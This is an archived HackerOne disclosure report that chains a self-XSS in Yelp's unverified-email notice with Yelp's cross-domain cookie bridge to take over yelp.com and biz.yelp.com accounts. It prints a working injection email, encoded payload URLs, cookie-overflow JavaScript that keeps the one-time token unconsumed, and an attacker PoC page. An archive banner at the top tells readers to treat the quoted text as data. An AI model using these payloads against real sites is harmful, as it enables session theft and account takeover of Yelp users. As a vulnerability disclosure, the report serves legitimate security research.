---
type: Article
title: "Yelp disclosed on HackerOne: yelp.com and biz.yelp.com ATO via XSS..."
description: "Chains a self-XSS in Yelp's unverified-email prompt with Yelp's cross-domain cookie bridge: the attacker signs the victim into an attacker account on yelp.dk so the XSS runs, then sets oversized cookies so the victim's own bridge transfer fails without consuming its one-time token, letting the attacker read the retrieve URL and take over the victim's HttpOnly session."
resource: "https://hackerone.com/reports/2089042"
tags: [article, webseclist-reference, en, hackerone, xss, cookie, session-fixation, same-origin-policy, info-leak, attack-chain, bug-bounty, owasp-a01-2021, owasp-a03-2021, owasp-a07-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-09T02:39:29+00:00"
status: stable
stale_after: 2027-08-09
sources:
  - id: original
    resource: "https://hackerone.com/reports/2089042"
    title: "Yelp disclosed on HackerOne: yelp.com and biz.yelp.com ATO via XSS..."
    author: lil_endian
also_at: []
authors:
  - lil_endian
canonical_url: ""
cited_by:
  - "2023.md:61"
commit: ""
content_sha256: 37b782d7b79766251d85dad7ba9c83a28955011fca050fe8c34c7ad0b646ab68
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://hackerone.com/reports/2089042"
published: ""
publisher: HackerOne
publisher_english: ""
raw_sha256: fcdefe0f55751f2627ad2ff94ebbcf2200fd8fdfa3c0d38eb1a7762413f7ec54
retrieved_from: "https://hackerone.com/reports/2089042"
retrieved_kind: browser
retrieved_utc: "2026-09-14T09:15:17+00:00"
slug: hackerone-yelp-disclosed-hackerone-yelp-com-biz-yelp-com-ato-xss
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Yelp disclosed on HackerOne: yelp.com and biz.yelp.com ATO via XSS...

**Yelp disclosed on HackerOne: yelp.com and biz.yelp.com ATO via XSS...** - lil_endian, HackerOne.

- Published: date not stated
- Original: <https://hackerone.com/reports/2089042>
- Preserved from: https://hackerone.com/reports/2089042 (browser) on 2026-09-14
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

119

[#2089042](https://hackerone.com/reports/2089042)

yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge

Report

Timeline

[![lil_endian](https://profile-photos.hackerone-user-content.com/variants/9twt9d0lw2i8ezf2u95l60ovgxpu/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6)](https://hackerone.com/lil_endian)

[lil_endian](https://hackerone.com/lil_endian)

 submitted a report to [**Yelp**](https://hackerone.com/yelp).

July 28, 2023, 11:12pm UTC

# Summary

I've found an XSS on `biz.yelp.com` where the unverified email will be reflected in a message, prompting the user to verify the email. This XSS can be combined with the cookie bridge functionality to target other uses with the XSS. The XSS can then be combined with the cookie bridge a second time to leak `HttpOnly` session cookies, and makes account takeover possible for both business accounts and regular accounts.

# Description

## XSS in business user email

When a business user has not verified their email, a message is shown telling them to verify the email. The users email is reflected in this message, and it's possible to choose an email that will result in XSS. ███████ There is a 64 char limit on the chosen email, but it's just enough to achieve arbitrary javascript execution by choosing the email

**Code**•64 Bytes

```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```

and putting the payload base64 encoded in the url fragment

**Image**•74.06 KiB•F2544129: 2023-07-28-161149_1206x805_scrot.png

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f10yz2i0w55d7tlj23pjhsj8wug8?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161149_1206x805_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161149_1206x805_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5a7d9b3d087219dec0f78f94ad648886e63c5a351e7ec7940be01c859897bc3)

**Image**•236.19 KiB•F2544130: 2023-07-28-161210_1202x803_scrot.png

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nd09w76timz24g46ukx34e8pg2g2?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161210_1202x803_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161210_1202x803_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a65600e57fc1f3c9609624735f715ad02a18c5a0b3e05b6e78356c75b9700c4)

At this point this is just a Self-XSS, but I'll show how this can be used to target other uses.

## yelp.com's Cookie Bridge

Yelp has local versions of the website, so a user requesting the site in danish, will be redirected to `yelp.dk` and a user requesting the site in german will be redirected to `yelp.de`. If a users is signed into `yelp.com` and wishes to change language to danish, they can't just be sent to `yelp.dk` without having to log in again since `yelp.com` and `yelp.dk` are 2 completely different domains in the eyes of the browser, and so the users session cookies can't be used for both domains.

To solve this challenge, Yelp has implemented a Cookie Bridge that works by sending a GET request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. The backend will take all the users cookies and save them, redirect them to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F` which will then set the same cookies for the `yelp.dk` domain. The value of the `cookie_fsid` is unique for our cookies, and can only be used to retrieve the cookies once.

## Using the Cookie Bridge to sign other users into our account

We can use the Cookie bridge to sign a victim into our account. While signed into our account on `biz.yelp.com` we send a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK`. This will result in a `303` redirect to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=%2F`. Instead of following the redirect we can have a victim visit the link, and they'll then be signed into our business user on `biz.yelp.dk`. We can even use the `redir` parameter to redirect the victim to `/home#[OUR BASE64 ENCODED XSS PAYLOAD]` and have the XSS trigger

## Using the XSS for ATO

The situation is as follows: The victim is logged in on `biz.yelp.com`. We sign the victim into the attacker account on `biz.yelp.dk` where our XSS triggers. The XSS can't make any changes to the victim account due to `biz.yelp.com` and `biz.yelp.dk` being different domains. For the XSS to be effective we need to sign the victim account into `biz.yelp.dk` The attack looks like this:

- Victim is logged into `biz.yelp.com`.
- The victim clicks on our page, which open a new tab. We'll call the opener tab "Tab A" and the new tab "Tab B". Tab B will load the cookie bridge retrieve endpoint that signs the victim into our attacker account on `biz.yelp.dk`, and triggers the XSS:

**Code**•121 Bytes

```
https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=qCN_L-QbDTAVmqgKIAs2Dw&redir=/home/%23[XSS PAYLOAD BASE64 ENCODED]
```

- Now we have javascript execution in Tab B. We now get a reference to Tab A and redirects it via `window.opener.location.href = "https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"`. This will sign the victim into their own account on `biz.yelp.dk`. But our XSS is still alive in Tab B so we can now make requests from `biz.yelp.dk` with the victims session cookies.

At this point we're turned what started as a Self-XSS into regular XSS in the victims session. But we can improve the attack to steal the session cookies of the victims account, even though they're marked `HttpOnly` and not available from javascript. To do this we change the last step above and do the following instead:

- Using our XSS in Tab B we set several large cookies on `biz.yelp.dk` for the path `/cookie_bridge/retrieve`.:

**Code**•121 Bytes

```
for (var i = 0; i < 15; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
```

this will make all requests to `https://biz.yelp.dk/cookie_bridge/retrieve` fail, as openresty will complain that the cookie is too large. This will prevent the `cookie_fsid` token from being consumed:

**Image**•36.11 KiB•F2544131: 2023-07-28-170955_1204x418_scrot.png

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tgc0w9nyg0riynvekg11j1r9l7db?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-170955_1204x418_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-170955_1204x418_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a3bce309302cf1a7e1dc8c7081d432e3a23ef157d42b1e2dad307e930af2354)

- We now point Tab A to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` which will attempt to transfer the victim account cookies to `biz.yelp.dk`, but will end up failing with a 400 error page since the cookie header is too large.
- Now Tab B can access Tab A's location via `window.opener.location.href` since they share the same origin `biz.yelp.dk`. Tab B can now leak the retrieve url for the victims session cookies, and the attacker can simply visit this url to be signed in as the victim. This works for both business accounts and regular yelp accounts.

# POC and video

We create a business account with the email `"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh` without verifying it to get the Self-XSS gadget we need.

Using this account we make a request to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK&redir=/home/%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D` which returns a 303 redirect to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=cZ1U9eNTN2is8YaF4pCBWA&redir=%2Fhome%2F%23Zm9yICh2YXIgaSA9IDA7IGkgPCAxNjsgaSsrKSB7ZG9jdW1lbnQuY29va2llID0gYFgke2l9PSR7J1gnLnJlcGVhdCgxMDAwKX07IG1heC1hZ2U9ODY0MDA7IHBhdGg9L2Nvb2tpZV9icmlkZ2UvcmV0cmlldmVgfQp3aW5kb3cub3BlbmVyLnBvc3RNZXNzYWdlKHtyZWRpcmVjdDoiaHR0cHM6Ly9iaXoueWVscC5jb20vY29va2llX2JyaWRnZS9zdG9yZT9kaGw9ZGFfREsifSwgIioiKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHthbGVydCgiYXR0YWNrZXIgY2FuIG5vdyBzaWduIGluIGFzIHZpY3RpbSBieSBnb2luZyB0bzoiICsgd2luZG93Lm9wZW5lci5sb2NhdGlvbi5ocmVmKX0sIDUwMDApOw%3D%3D`.

**Image**•389.96 KiB•F2544134: 2023-07-28-172439_1624x1193_scrot.png

![](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xbuaor61ug553x6fi9xj60yrx2uf?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-172439_1624x1193_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-172439_1624x1193_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b0a5103595b1b809996333611ecd6ee44798dc64d4f9929125411d670738a78a)

Getting this URL can obviously be automated, but for this POC we're just getting it manually and giving it as an argument to our POC HTML attack page. The attacker page looks like this:

**Code**•628 Bytes

```
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <title>yelp xss poc</title>
 <script>
 function openTarget() {
      t = document.location.hash.substring(1);
      window.target = window.open(t);
 }

 // register a postmessage listener
    window.addEventListener('message', function (e) {
      console.log(e);
 if (e.data && e.data.redirect) {
        location.href = e.data.redirect; // this is vulnerable to xss but idc
 }
 });

 </script>
</head>
<body>
 <h1>Yelp.com account takeover POC</h1>
 <button onclick="openTarget()">click here to start attack</button>
</body>
</html>
```

and is hosted here: `https://calc.sh/yelp-poc-bah7ooli.html`. When the victim clicks our link in their browser they'll be signed in to our attacker account and the XSS payload will run. The payload is base64 encoded and the decoded payload looks like this:

**Code**•337 Bytes

```
for (var i = 0; i < 16; i++) {document.cookie = `X${i}=${'X'.repeat(1000)}; max-age=86400; path=/cookie_bridge/retrieve`}
window.opener.postMessage({redirect:"https://biz.yelp.com/cookie_bridge/store?dhl=da_DK"}, "*");
setTimeout(function() {alert("attacker can now sign in as victim by going to:" + window.opener.location.href)}, 5000);
```

This code will set 16 large cookies each containing 1000 'X' chars. This will be enough to trigger the 400 error. After setting the cookies we find the opener tab, and send a postMessage asking it to redirect to `https://biz.yelp.com/cookie_bridge/store?dhl=da_DK` (*I'm using postMessage to do the redirect so that the attack also works in Firefox. In Chrome we could simply set `window.opener.location.href`, but that doesn't work in Firefox for some reason*). The browser will be redirected to `https://biz.yelp.dk/cookie_bridge/retrieve?cookie_fsid=[FSID VALUE]` but will trigger the 400 error such that the `cookie_fsid` won't be consumed. The last line in our payload can now read the href of the opener window as they share the same origin, and we show the url in an alert box to demonstrate the attacker now has the url and can sign in as the victim.

This video shows the attack explained above, and demonstrates that the attacker is able to take over both a normal yelp account and a business account.

**Video**•13.60 MiB•F2544137: biz.yelp-yelp-ato-poc.mp4

## Impact

An attacker can leak the session cookies of a victim even though they're set as HttpOnly and sign in to the victims account. This works for both normal accounts and business accounts.

**5 attachments**

-

F2544129: [2023-07-28-161149_1206x805_scrot.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f10yz2i0w55d7tlj23pjhsj8wug8?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161149_1206x805_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161149_1206x805_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTEJqIwtl13TNv6FmQBt70wC7DdQrZb9%2B0KEHF4Q4Z1xZyw1nNulaM1K4Q9KYE61KvY91WPouzUWn5DEvBk2BLy8xu3QalpO6k70zRiaw9FTHSTJmt5HT%2FrQk5v8YajH5WiCAkIXsc3lCyf5l8RBNgKVh3XoXm%2Fopo2Wj3cE%2BfqqttQA%2BTBLsITxsvZQMR5GtFX6PAX7CCQaRDVP0vphAjky0q5zfAQaFS1rogk4r9Uom%2BJY9noefNoT8T7nu1kiO8WA9LmNrZmrMS2uJ%2F%2Fb3affiQRk2TxGREaXzbrPyHZdKKffDHw5qEUnwc1o%2Fze2LH58EYANSBglcYm7nfPg0cvjbG%2F%2BaAbuJsQFP7BOx6IGtsTWbIhQ9Hzt3p5j46wpoXT4Rg8acJN9EGIomRJ3oslndkP2XX8M1sxFeKI8Bz2%2BfPKmDu0eN%2BXDvmD%2FhPOUB7D2yQo%2BC2Mqp9zocBKNAe1reaC3nf%2BILW%2BhFvEHzwjiD3Y7raiUw9pwRreAUkDQ0u%2BpItM0OGoV7ge7cQsYVyQeAQccfpglsv%2FkbVhdTYD0pu%2F5aNh2Z01L9oUewkf0%2BRBObI4jIW97HajMiUoscXYIUa7sxkp8di92eZTm4U6wxMNjMoE6rX9C90jG5Ijru2VVvi917jiji%2Br%2FhFtMfzu6tz2dGOBeljsC1oMV3Xtl2pBVSLDOP4SN8uR0EsIlZM%2FZCD58DCCt9%2FTBjqyAYsv69Pv%2FtK3v6AqhUydIyQLOD8S9rwMe7VX4dq6XjtqwYMlei5KYphJezMcrBZITyFP5v%2BcG8ZHOUocuIWkSyDUKG5%2FJz9AA%2F%2BJwW%2FxyK2aPAhCqkgB%2FQhXfQYNd4pMCf9%2B1y4Na17NOrD4oI9DrfPKLUqoISxX%2FxQR8Y6E9UBhmBUj9YNPLZfZ81Cl06P%2FFrUj%2FRCB57o2hE0XZdmBcGGsKrfYdyTGqPOVWYWpgsGSXXQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5a7d9b3d087219dec0f78f94ad648886e63c5a351e7ec7940be01c859897bc3)

-

F2544130: [2023-07-28-161210_1202x803_scrot.png](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nd09w76timz24g46ukx34e8pg2g2?response-content-disposition=attachment%3B%20filename%3D%222023-07-28-161210_1202x803_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272023-07-28-161210_1202x803_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED_AWS_ACCESS_KEY_ID%2F20260809%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260809T021354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICIW9EFiCLAk%2FkixA1LKiTXYfYpj55mJBYPlsIecaF1SAiBtM117mc2k0c9z5TzMRELxkaFMxnnAF9uBpRVMQ4LSfSqyBQh7EAMaDDAxMzYxOTI3NDg0OSIMsTCry8mhZ0YuE9RqKo8F0hSO8Qvb682mtFHEVN1CqALFEk%2FWGMkq1jnrN2HkOowqSeOJLzP9iCA3HMJJzTn3Iu52OpH9ma3rH9z33F4Sh4tpcPeiJc8489f16k4BU5saX9Rmj1qKm3LomjZAYcuxktb2WUEosRQLImwoVidQAvZVyIANzTViCBTE